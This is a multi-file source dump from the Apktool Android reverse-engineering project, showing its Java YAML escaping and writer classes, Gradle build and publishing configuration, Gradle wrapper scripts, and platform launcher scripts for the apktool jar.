
`brut.j.yaml/src/main/java/brut/yaml/YamlStringEscapeUtils.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.yaml;

import org.apache.commons.text.StringEscapeUtils;
import org.apache.commons.text.translate.CharSequenceTranslator;

import java.io.IOException;
import java.io.StringWriter;
import java.io.Writer;

public final class YamlStringEscapeUtils {

    private YamlStringEscapeUtils() {
        // Private constructor for utility class.
    }

    public static String escapeString(String str) {
        return escapeJavaStyleString(str);
    }

    /**
     * @param str String to escape values in, may be null
     * @return the escaped string
     */
    private static String escapeJavaStyleString(String str) {
        if (str == null) {
            return null;
        }
        try {
            StringWriter writer = new StringWriter(str.length() * 2);
            escapeJavaStyleString(writer, str);
            return writer.toString();
        } catch (IOException ioe) {
            // this should never ever happen while writing to a StringWriter
            throw new RuntimeException(ioe);
        }
    }

    /**
     * @param writer Writer to receive the escaped string
     * @param str String to escape values in, may be null
     * @throws IOException if an IOException occurs
     */
    private static void escapeJavaStyleString(Writer writer, String str) throws IOException {
        if (writer == null) {
            throw new IllegalArgumentException("The Writer must not be null");
        }
        if (str == null) {
            return;
        }
        int len = str.length();
        for (int i = 0; i < len; i++) {
            char ch = str.charAt(i);
            // "[^\t\n\r\u0020-\u007E\u0085\u00A0-\uD7FF\uE000-\uFFFD]"
            // handle unicode
            if (ch > 0xFFFD) {
                writer.write("\\u" + CharSequenceTranslator.hex(ch));
            } else if (ch > 0xD7FF && ch < 0xE000) {
                writer.write("\\u" + CharSequenceTranslator.hex(ch));
            } else if (ch > 0x7E && ch != 0x85 && ch < 0xA0) {
                writer.write("\\u00" + CharSequenceTranslator.hex(ch));
            } else if (ch < 0x20) {
                switch (ch) {
                    case '\n' :
                        writer.write('\\');
                        writer.write('n');
                        break;
                    case '\r' :
                        writer.write('\\');
                        writer.write('r');
                        break;
                    case '\t' :
                        writer.write('\\');
                        writer.write('t');
                        break;
                    default :
                        if (ch > 0x0F) {
                            writer.write("\\u00" + CharSequenceTranslator.hex(ch));
                        } else {
                            writer.write("\\u000" + CharSequenceTranslator.hex(ch));
                        }
                        break;
                }
            } else {
                switch (ch) {
                    case '\'' :
                        writer.write('\'');
                        break;
                    case '"' :
                        writer.write('\\');
                        writer.write('"');
                        break;
                    case '\\' :
                        writer.write('\\');
                        writer.write('\\');
                        break;
                    case '/' :
                        writer.write('/');
                        break;
                    default :
                        writer.write(ch);
                        break;
                }
            }
        }
    }

    /**
     * <p>Unescapes any Java literals found in the <code>String</code>.
     * For example, it will turn a sequence of <code>'\'</code> and
     * <code>'n'</code> into a newline character, unless the <code>'\'</code>
     * is preceded by another <code>'\'</code>.</p>
     *
     * @param str  the <code>String</code> to unescape, may be null
     * @return a new unescaped <code>String</code>, <code>null</code> if null string input
     */
    public static String unescapeString(String str) {
        return StringEscapeUtils.unescapeJava(str);
    }
}

```

`brut.j.yaml/src/main/java/brut/yaml/YamlWriter.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.yaml;

import java.io.BufferedWriter;
import java.io.Closeable;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Objects;

public class YamlWriter implements Closeable {
    private static final String QUOTE = "'";

    private final PrintWriter mWriter;
    private int mIndent;

    public YamlWriter(OutputStream out) {
        mWriter = new PrintWriter(new BufferedWriter(
            new OutputStreamWriter(out, StandardCharsets.UTF_8)));
    }

    @Override
    public void close() throws IOException {
        mWriter.close();
    }

    public String getIndentString() {
        // for java 11
        // return " ".repeat(mIndent);
        // for java 8
        return String.join("", Collections.nCopies(mIndent, " "));
    }

    public static String escape(String value) {
        return YamlStringEscapeUtils.escapeString(value);
    }

    public void nextIndent() {
        mIndent += 2;
    }

    public void prevIndent() {
        if (mIndent != 0) {
            mIndent -= 2;
        }
    }

    public void writeIndent() {
        mWriter.print(getIndentString());
    }

    public void writeString(String key, String value) {
        writeString(key, value, false);
    }

    public void writeString(String key, String value, boolean quoted) {
        writeIndent();
        String val;
        if (Objects.isNull(value)) {
            val = "null";
        } else {
            val = escape(value);
            if (quoted) {
                val = QUOTE + val + QUOTE;
            }
        }
        mWriter.println(escape(key) + ": " + val);
    }

    public void writeInt(String key, int value) {
        writeIndent();
        String val = Integer.toString(value);
        mWriter.println(escape(key) + ": " + val);
    }

    public void writeBool(String key, boolean value) {
        writeIndent();
        String val = value ? "true": "false";
        mWriter.println(escape(key) + ": " + val);
    }

    public <T> void writeList(String key, List<T> list) {
        if (Objects.isNull(list)) {
            return;
        }
        writeIndent();
        mWriter.println(escape(key) + ":");
        for (T item : list) {
            writeIndent();
            mWriter.println("- " + item);
        }
    }

    public <T> void writeMap(String key, Map<String, T> map) {
        if (Objects.isNull(map)) {
            return;
        }
        writeIndent();
        mWriter.println(escape(key) + ":");
        nextIndent();
        for (String mapKey : map.keySet()) {
            writeString(mapKey, String.valueOf(map.get(mapKey)));
        }
        prevIndent();
    }

    public <T extends YamlSerializable> void writeObject(String key, T obj) {
        if (Objects.isNull(obj)) {
            return;
        }
        writeIndent();
        mWriter.println(escape(key) + ":");
        nextIndent();
        obj.write(this);
        prevIndent();
    }
}

```

`build.gradle.kts`:

```kts
import java.io.ByteArrayOutputStream

val version = "3.0.2"
val suffix = "SNAPSHOT"

// Strings embedded into the build.
var gitRevision by extra("")
var apktoolVersion by extra("")

defaultTasks("build", "shadowJar", "proguard")

// Functions
val gitDescribe: String? by lazy {
    try {
        val result = providers.exec {
            commandLine("git", "describe", "--tags")
        }
        result.standardOutput.asText.get().trim().replace("-g", "-")
    } catch (e: Exception) {
        null
    }
}

val gitBranch: String? by lazy {
    try {
        val result = providers.exec {
            commandLine("git", "rev-parse", "--abbrev-ref", "HEAD")
        }
        result.standardOutput.asText.get().trim()
    } catch (e: Exception) {
        null
    }
}

if ("release" !in gradle.startParameter.taskNames) {
    val hash = gitDescribe

    if (hash == null) {
        gitRevision = "dirty"
        apktoolVersion = "$version-dirty"
        project.logger.lifecycle("Building SNAPSHOT (no .git folder found)")
    } else {
        gitRevision = hash
        apktoolVersion = "$hash-SNAPSHOT"
        project.logger.lifecycle("Building SNAPSHOT ($gitBranch): $gitRevision")
    }
} else {
    gitRevision = ""
    apktoolVersion = if (suffix.isNotEmpty()) "$version-$suffix" else version;
    project.logger.lifecycle("Building RELEASE ($gitBranch): $apktoolVersion")
}

plugins {
    `java-library`
    if (JavaVersion.current().isJava11Compatible) {
        alias(libs.plugins.vanniktech.maven.publish) apply false
    }
}

allprojects {
    repositories {
        mavenCentral()
        // Obtain baksmali/smali from source builds - https://github.com/iBotPeaches/smali
        // Remove when official smali releases come out again.
        maven {
            url = uri("https://jitpack.io")
            content {
                includeGroup("com.github.iBotPeaches.smali")
            }
        }
        google()
    }
}

subprojects {
    apply(plugin = "java")
    apply(plugin = "java-library")

    java {
        sourceCompatibility = JavaVersion.VERSION_1_8
        targetCompatibility = JavaVersion.VERSION_1_8
    }

    val mavenProjects = arrayOf(
        "brut.j.common", "brut.j.util", "brut.j.dir", "brut.j.xml", "brut.j.yaml",
        "apktool-lib", "apktool-cli"
    )

    if (project.name in mavenProjects && JavaVersion.current().isJava11Compatible) {
        apply(from = "${rootProject.projectDir}/gradle/scripts/publishing.gradle")
    }
}

tasks.register("release") {
    // Used for official releases.
}

tasks.wrapper {
    distributionType = Wrapper.DistributionType.ALL
}

tasks.withType<JavaCompile> {
    options.compilerArgs.add("-Xlint:-options")
    options.compilerArgs.add("--release 8")

    options.encoding = "UTF-8"
}

```

`gradle/libs.versions.toml`:

```toml
[versions]
baksmali = "b6365a84f4" # https://github.com/google/smali/issues/100
commons_io = "2.21.0"
commons_cli = "1.11.0"
commons_lang3 = "3.20.0"
commons_text = "1.15.0"
guava = "33.5.0-jre"
junit = "4.13.2"
r8 = "9.0.32"
smali = "b6365a84f4" # https://github.com/google/smali/issues/100
xmlpull = "1.1.3.1"
xmlunit = "2.11.0"
maven-publish = "0.33.0"

[libraries]
baksmali = { module = "com.github.iBotPeaches.smali:smali-baksmali", version.ref = "baksmali" }
commons_cli = { module = "commons-cli:commons-cli", version.ref = "commons_cli"}
commons_io = { module = "commons-io:commons-io", version.ref = "commons_io" }
commons_lang3 = { module = "org.apache.commons:commons-lang3", version.ref = "commons_lang3" }
commons_text = { module = "org.apache.commons:commons-text", version.ref = "commons_text" }
guava = { module = "com.google.guava:guava", version.ref = "guava" }
junit = { module = "junit:junit", version.ref = "junit" }
r8 = { module = "com.android.tools:r8", version.ref = "r8" }
smali = { module = "com.github.iBotPeaches.smali:smali", version.ref = "smali" }
xmlpull = { module = "xmlpull:xmlpull", version.ref = "xmlpull" }
xmlunit = { module = "org.xmlunit:xmlunit-legacy", version.ref = "xmlunit" }

[plugins]
vanniktech-maven-publish = { id = "com.vanniktech.maven.publish", version.ref = "maven-publish" }

```

`gradle/scripts/publishing.gradle`:

```gradle
apply plugin: 'com.vanniktech.maven.publish'

mavenPublishing {
    publishToMavenCentral()
    signAllPublications()

    coordinates("org.apktool", project.name, project.apktoolVersion)

    pom {
        name = "Apktool"
        description = "A tool for reverse engineering Android apk files."
        url = "https://apktool.org"

        licenses {
            license {
                name = "The Apache License 2.0"
                url = "https://opensource.org/licenses/Apache-2.0"
            }
        }
        developers {
            developer {
                id = "iBotPeaches"
                name = "Connor Tumbleson"
                email = "connor.tumbleson@gmail.com"
            }
            developer {
                id = "brutall"
                name = "Ryszard Wiśniewski"
                email = "brut.alll@gmail.com"
            }
        }
        scm {
            connection = "scm:git:git://github.com/iBotPeaches/Apktool.git"
            developerConnection = "scm:git:git@github.com:iBotPeaches/Apktool.git"
            url = "https://github.com/iBotPeaches/Apktool"
        }
    }
}

tasks.withType(Javadoc) {
    options.addStringOption('Xdoclint:none', '-quiet')
}

```

`gradle/wrapper/gradle-wrapper.properties`:

```properties
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-8.14.4-all.zip
networkTimeout=10000
validateDistributionUrl=true
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists

```

`gradlew`:

```
#!/bin/sh

#
# Copyright © 2015-2021 the original authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

##############################################################################
#
#   Gradle start up script for POSIX generated by Gradle.
#
#   Important for running:
#
#   (1) You need a POSIX-compliant shell to run this script. If your /bin/sh is
#       noncompliant, but you have some other compliant shell such as ksh or
#       bash, then to run this script, type that shell name before the whole
#       command line, like:
#
#           ksh Gradle
#
#       Busybox and similar reduced shells will NOT work, because this script
#       requires all of these POSIX shell features:
#         * functions;
#         * expansions «$var», «${var}», «${var:-default}», «${var+SET}»,
#           «${var#prefix}», «${var%suffix}», and «$( cmd )»;
#         * compound commands having a testable exit status, especially «case»;
#         * various built-in commands including «command», «set», and «ulimit».
#
#   Important for patching:
#
#   (2) This script targets any POSIX shell, so it avoids extensions provided
#       by Bash, Ksh, etc; in particular arrays are avoided.
#
#       The "traditional" practice of packing multiple parameters into a
#       space-separated string is a well documented source of bugs and security
#       problems, so this is (mostly) avoided, by progressively accumulating
#       options in "$@", and eventually passing that to Java.
#
#       Where the inherited environment variables (DEFAULT_JVM_OPTS, JAVA_OPTS,
#       and GRADLE_OPTS) rely on word-splitting, this is performed explicitly;
#       see the in-line comments for details.
#
#       There are tweaks for specific operating systems such as AIX, CygWin,
#       Darwin, MinGW, and NonStop.
#
#   (3) This script is generated from the Groovy template
#       https://github.com/gradle/gradle/blob/HEAD/subprojects/plugins/src/main/resources/org/gradle/api/internal/plugins/unixStartScript.txt
#       within the Gradle project.
#
#       You can find Gradle at https://github.com/gradle/gradle/.
#
##############################################################################

# Attempt to set APP_HOME

# Resolve links: $0 may be a link
app_path=$0

# Need this for daisy-chained symlinks.
while
    APP_HOME=${app_path%"${app_path##*/}"}  # leaves a trailing /; empty if no leading path
    [ -h "$app_path" ]
do
    ls=$( ls -ld "$app_path" )
    link=${ls#*' -> '}
    case $link in             #(
      /*)   app_path=$link ;; #(
      *)    app_path=$APP_HOME$link ;;
    esac
done

# This is normally unused
# shellcheck disable=SC2034
APP_BASE_NAME=${0##*/}
# Discard cd standard output in case $CDPATH is set (https://github.com/gradle/gradle/issues/25036)
APP_HOME=$( cd "${APP_HOME:-./}" > /dev/null && pwd -P ) || exit

# Use the maximum available, or set MAX_FD != -1 to use that value.
MAX_FD=maximum

warn () {
    echo "$*"
} >&2

die () {
    echo
    echo "$*"
    echo
    exit 1
} >&2

# OS specific support (must be 'true' or 'false').
cygwin=false
msys=false
darwin=false
nonstop=false
case "$( uname )" in                #(
  CYGWIN* )         cygwin=true  ;; #(
  Darwin* )         darwin=true  ;; #(
  MSYS* | MINGW* )  msys=true    ;; #(
  NONSTOP* )        nonstop=true ;;
esac

CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar


# Determine the Java command to use to start the JVM.
if [ -n "$JAVA_HOME" ] ; then
    if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
        # IBM's JDK on AIX uses strange locations for the executables
        JAVACMD=$JAVA_HOME/jre/sh/java
    else
        JAVACMD=$JAVA_HOME/bin/java
    fi
    if [ ! -x "$JAVACMD" ] ; then
        die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME

Please set the JAVA_HOME variable in your environment to match the
location of your Java installation."
    fi
else
    JAVACMD=java
    if ! command -v java >/dev/null 2>&1
    then
        die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.

Please set the JAVA_HOME variable in your environment to match the
location of your Java installation."
    fi
fi

# Increase the maximum file descriptors if we can.
if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
    case $MAX_FD in #(
      max*)
        # In POSIX sh, ulimit -H is undefined. That's why the result is checked to see if it worked.
        # shellcheck disable=SC2039,SC3045
        MAX_FD=$( ulimit -H -n ) ||
            warn "Could not query maximum file descriptor limit"
    esac
    case $MAX_FD in  #(
      '' | soft) :;; #(
      *)
        # In POSIX sh, ulimit -n is undefined. That's why the result is checked to see if it worked.
        # shellcheck disable=SC2039,SC3045
        ulimit -n "$MAX_FD" ||
            warn "Could not set maximum file descriptor limit to $MAX_FD"
    esac
fi

# Collect all arguments for the java command, stacking in reverse order:
#   * args from the command line
#   * the main class name
#   * -classpath
#   * -D...appname settings
#   * --module-path (only if needed)
#   * DEFAULT_JVM_OPTS, JAVA_OPTS, and GRADLE_OPTS environment variables.

# For Cygwin or MSYS, switch paths to Windows format before running java
if "$cygwin" || "$msys" ; then
    APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
    CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )

    JAVACMD=$( cygpath --unix "$JAVACMD" )

    # Now convert the arguments - kludge to limit ourselves to /bin/sh
    for arg do
        if
            case $arg in                                #(
              -*)   false ;;                            # don't mess with options #(
              /?*)  t=${arg#/} t=/${t%%/*}              # looks like a POSIX filepath
                    [ -e "$t" ] ;;                      #(
              *)    false ;;
            esac
        then
            arg=$( cygpath --path --ignore --mixed "$arg" )
        fi
        # Roll the args list around exactly as many times as the number of
        # args, so each arg winds up back in the position where it started, but
        # possibly modified.
        #
        # NB: a `for` loop captures its iteration list before it begins, so
        # changing the positional parameters here affects neither the number of
        # iterations, nor the values presented in `arg`.
        shift                   # remove old arg
        set -- "$@" "$arg"      # push replacement arg
    done
fi


# Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'

# Collect all arguments for the java command:
#   * DEFAULT_JVM_OPTS, JAVA_OPTS, JAVA_OPTS, and optsEnvironmentVar are not allowed to contain shell fragments,
#     and any embedded shellness will be escaped.
#   * For example: A user cannot expect ${Hostname} to be expanded, as it is an environment variable and will be
#     treated as '${Hostname}' itself on the command line.

set -- \
        "-Dorg.gradle.appname=$APP_BASE_NAME" \
        -classpath "$CLASSPATH" \
        org.gradle.wrapper.GradleWrapperMain \
        "$@"

# Stop when "xargs" is not available.
if ! command -v xargs >/dev/null 2>&1
then
    die "xargs is not available"
fi

# Use "xargs" to parse quoted args.
#
# With -n1 it outputs one arg per line, with the quotes and backslashes removed.
#
# In Bash we could simply go:
#
#   readarray ARGS < <( xargs -n1 <<<"$var" ) &&
#   set -- "${ARGS[@]}" "$@"
#
# but POSIX shell has neither arrays nor command substitution, so instead we
# post-process each arg (as a line of input to sed) to backslash-escape any
# character that might be a shell metacharacter, then use eval to reverse
# that process (while maintaining the separation between arguments), and wrap
# the whole thing up as a single "set" statement.
#
# This will of course break if any of these variables contains a newline or
# an unmatched quote.
#

eval "set -- $(
        printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
        xargs -n1 |
        sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
        tr '\n' ' '
    )" '"$@"'

exec "$JAVACMD" "$@"

```

`gradlew.bat`:

```bat
@rem
@rem Copyright 2015 the original author or authors.
@rem
@rem Licensed under the Apache License, Version 2.0 (the "License");
@rem you may not use this file except in compliance with the License.
@rem You may obtain a copy of the License at
@rem
@rem      https://www.apache.org/licenses/LICENSE-2.0
@rem
@rem Unless required by applicable law or agreed to in writing, software
@rem distributed under the License is distributed on an "AS IS" BASIS,
@rem WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
@rem See the License for the specific language governing permissions and
@rem limitations under the License.
@rem

@if "%DEBUG%"=="" @echo off
@rem ##########################################################################
@rem
@rem  Gradle startup script for Windows
@rem
@rem ##########################################################################

@rem Set local scope for the variables with windows NT shell
if "%OS%"=="Windows_NT" setlocal

set DIRNAME=%~dp0
if "%DIRNAME%"=="" set DIRNAME=.
@rem This is normally unused
set APP_BASE_NAME=%~n0
set APP_HOME=%DIRNAME%

@rem Resolve any "." and ".." in APP_HOME to make it shorter.
for %%i in ("%APP_HOME%") do set APP_HOME=%%~fi

@rem Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
set DEFAULT_JVM_OPTS="-Xmx64m" "-Xms64m"

@rem Find java.exe
if defined JAVA_HOME goto findJavaFromJavaHome

set JAVA_EXE=java.exe
%JAVA_EXE% -version >NUL 2>&1
if %ERRORLEVEL% equ 0 goto execute

echo. 1>&2
echo ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH. 1>&2
echo. 1>&2
echo Please set the JAVA_HOME variable in your environment to match the 1>&2
echo location of your Java installation. 1>&2

goto fail

:findJavaFromJavaHome
set JAVA_HOME=%JAVA_HOME:"=%
set JAVA_EXE=%JAVA_HOME%/bin/java.exe

if exist "%JAVA_EXE%" goto execute

echo. 1>&2
echo ERROR: JAVA_HOME is set to an invalid directory: %JAVA_HOME% 1>&2
echo. 1>&2
echo Please set the JAVA_HOME variable in your environment to match the 1>&2
echo location of your Java installation. 1>&2

goto fail

:execute
@rem Setup the command line

set CLASSPATH=%APP_HOME%\gradle\wrapper\gradle-wrapper.jar


@rem Execute Gradle
"%JAVA_EXE%" %DEFAULT_JVM_OPTS% %JAVA_OPTS% %GRADLE_OPTS% "-Dorg.gradle.appname=%APP_BASE_NAME%" -classpath "%CLASSPATH%" org.gradle.wrapper.GradleWrapperMain %*

:end
@rem End local scope for the variables with windows NT shell
if %ERRORLEVEL% equ 0 goto mainEnd

:fail
rem Set variable GRADLE_EXIT_CONSOLE if you need the _script_ return code instead of
rem the _cmd.exe /c_ return code!
set EXIT_CODE=%ERRORLEVEL%
if %EXIT_CODE% equ 0 set EXIT_CODE=1
if not ""=="%GRADLE_EXIT_CONSOLE%" exit %EXIT_CODE%
exit /b %EXIT_CODE%

:mainEnd
if "%OS%"=="Windows_NT" endlocal

:omega

```

`scripts/linux/apktool`:

```
#!/bin/bash
#
# Copyright (C) 2007 The Android Open Source Project
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# This script is a wrapper for apktool.jar, so you can simply call "apktool",
# instead of java -jar apktool.jar. It is heavily based on the "dx" script
# from the Android SDK

# Set up prog to be the path of this script, including following symlinks,
# and set up progdir to be the fully-qualified pathname of its directory.
prog="$0"
while [ -h "${prog}" ]; do
    newProg=`/bin/ls -ld "${prog}"`

    newProg=`expr "${newProg}" : ".* -> \(.*\)$"`
    if expr "x${newProg}" : 'x/' >/dev/null; then
        prog="${newProg}"
    else
        progdir=`dirname "${prog}"`
        prog="${progdir}/${newProg}"
    fi
done
oldwd=`pwd`
progdir=`dirname "${prog}"`
cd "${progdir}"
progdir=`pwd`
prog="${progdir}"/`basename "${prog}"`
cd "${oldwd}"

jarfile=apktool.jar
libdir="$progdir"
if [ ! -r "$libdir/$jarfile" ]; then
    # Find the highest version of apktool_*.jar in the directory.
    highest_jarfile=$(ls "$libdir"/apktool_*.jar 2>/dev/null | sort -V | tail -n 1)
    if [ -n "$highest_jarfile" ]; then
        jarfile=$(basename "$highest_jarfile")
    else
        echo `basename "$prog"`": can't find $jarfile"
        exit 1
    fi
fi

javaOpts=""

# If you want DX to have more memory when executing, uncomment the following
# line and adjust the value accordingly. Use "java -X" for a list of options
# you can pass here.
#
javaOpts="-Xmx1024M -Dfile.encoding=utf-8 -Djdk.util.zip.disableZip64ExtraFieldValidation=true -Djdk.nio.zipfs.allowDotZipEntry=true"

# Alternatively, this will extract any parameter "-Jxxx" from the command line
# and pass them to Java (instead of to dx). This makes it possible for you to
# add a command-line parameter such as "-JXmx256M" in your ant scripts, for
# example.
while expr "x$1" : 'x-J' >/dev/null; do
    opt=`expr "$1" : '-J\(.*\)'`
    javaOpts="${javaOpts} -${opt}"
    shift
done

if [ "$OSTYPE" = "cygwin" ] ; then
    jarpath=`cygpath -w  "$libdir/$jarfile"`
else
    jarpath="$libdir/$jarfile"
fi

# add current location to path for aapt
PATH=$PATH:`pwd`;
export PATH;
exec java $javaOpts -jar "$jarpath" "$@"

```

`scripts/osx/apktool`:

```
#!/bin/bash
#
# Copyright (C) 2007 The Android Open Source Project
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# This script is a wrapper for apktool.jar, so you can simply call "apktool",
# instead of java -jar apktool.jar. It is heavily based on the "dx" script
# from the Android SDK

# Set up prog to be the path of this script, including following symlinks,
# and set up progdir to be the fully-qualified pathname of its directory.
prog="$0"
while [ -h "${prog}" ]; do
    newProg=`/bin/ls -ld "${prog}"`

    newProg=`expr "${newProg}" : ".* -> \(.*\)$"`
    if expr "x${newProg}" : 'x/' >/dev/null; then
        prog="${newProg}"
    else
        progdir=`dirname "${prog}"`
        prog="${progdir}/${newProg}"
    fi
done
oldwd=`pwd`
progdir=`dirname "${prog}"`
cd "${progdir}"
progdir=`pwd`
prog="${progdir}"/`basename "${prog}"`
cd "${oldwd}"

jarfile=apktool.jar
libdir="$progdir"
if [ ! -r "$libdir/$jarfile" ]
then
    # Find the highest version of apktool_*.jar in the directory.
    highest_jarfile=$(ls "$libdir"/apktool_*.jar 2>/dev/null | sort -V | tail -n 1)
    if [ -n "$highest_jarfile" ]; then
        jarfile=$(basename "$highest_jarfile")
    else
        echo `basename "$prog"`": can't find $jarfile"
        exit 1
    fi
fi

javaOpts=""

# If you want DX to have more memory when executing, uncomment the following
# line and adjust the value accordingly. Use "java -X" for a list of options
# you can pass here.
#
javaOpts="-Xmx1024M -Dfile.encoding=utf-8 -Djdk.util.zip.disableZip64ExtraFieldValidation=true -Djdk.nio.zipfs.allowDotZipEntry=true"

# Alternatively, this will extract any parameter "-Jxxx" from the command line
# and pass them to Java (instead of to dx). This makes it possible for you to
# add a command-line parameter such as "-JXmx256M" in your ant scripts, for
# example.
while expr "x$1" : 'x-J' >/dev/null; do
    opt=`expr "$1" : '-J\(.*\)'`
    javaOpts="${javaOpts} -${opt}"
    shift
done

if [ "$OSTYPE" = "cygwin" ] ; then
    jarpath=`cygpath -w  "$libdir/$jarfile"`
else
    jarpath="$libdir/$jarfile"
fi

# add current location to path for aapt
PATH=$PATH:`pwd`;
export PATH;
exec java $javaOpts -Djava.awt.headless=true -jar "$jarpath" "$@"

```

`scripts/windows/apktool.bat`:

```bat
@echo off
setlocal
set BASENAME=apktool_
chcp 65001 2>nul >nul

set java_exe=java.exe

if defined JAVA_HOME (
set "java_exe=%JAVA_HOME%\bin\java.exe"
)

rem Find the highest version .jar available in the same directory as the script
setlocal EnableDelayedExpansion
pushd "%~dp0"
if exist apktool.jar (
    set BASENAME=apktool
    goto skipversioned
)

set BASENAME=apktool
set max_major=0
set max_minor=0
set max_patch=0

rem Loop through all versioned .jar files matching the basename
for %%F in (%BASENAME%*.jar) do (
    set "filename=%%~nF"

    rem Extract version part (apktool-X.Y.Z)
    for /f "tokens=2 delims=_-" %%A in ("!filename!") do (
        for /f "tokens=1,2,3 delims=." %%B in ("%%A") do (
            set "major=%%B"
            set "minor=%%C"
            set "patch=%%D"

            rem Set Default minor/patch to 0
            if "!minor!"=="" set "minor=0"
            if "!patch!"=="" set "patch=0"

            rem Compare major version
            if !major! gtr !max_major! (
                set "max_major=!major!"
                set "max_minor=!minor!"
                set "max_patch=!patch!"
            ) else if !major! == !max_major! (
                rem Compare minor version
                if !minor! gtr !max_minor! (
                    set "max_minor=!minor!"
                    set "max_patch=!patch!"
                ) else if !minor! == !max_minor! (
                    rem Compare patch version
                    if !patch! gtr !max_patch! (
                        set "max_patch=!patch!"
                    )
                )
            )
        )
    )
)

rem Construct full version string
set "max=_!max_major!.!max_minor!.!max_patch!"

:skipversioned
popd
setlocal DisableDelayedExpansion

rem Find out if the commandline is a parameterless .jar or directory, for fast unpack/repack
if "%~1"=="" goto load
if not "%~2"=="" goto load
set ATTR=%~a1
if "%ATTR:~0,1%"=="d" (
    rem Directory, rebuild
    set fastCommand=b
)
if "%ATTR:~0,1%"=="-" if "%~x1"==".apk" (
    rem APK file, unpack
    set fastCommand=d
)

:load
"%java_exe%" -jar -Xmx1024M -Duser.language=en -Dfile.encoding=UTF8 -Djdk.util.zip.disableZip64ExtraFieldValidation=true -Djdk.nio.zipfs.allowDotZipEntry=true "%~dp0%BASENAME%%max%.jar" %fastCommand% %*

rem Pause when ran non interactively
for %%i in (%cmdcmdline%) do if /i "%%~i"=="/c" pause & exit /b

```

`settings.gradle.kts`:

```kts
rootProject.name = "apktool-cli"
include(
    "brut.j.common", "brut.j.util", "brut.j.dir", "brut.j.xml", "brut.j.yaml",
    "brut.apktool:apktool-lib", "brut.apktool:apktool-cli"
)

dependencyResolutionManagement {
    versionCatalogs {
        create("libs") {}
    }
}

```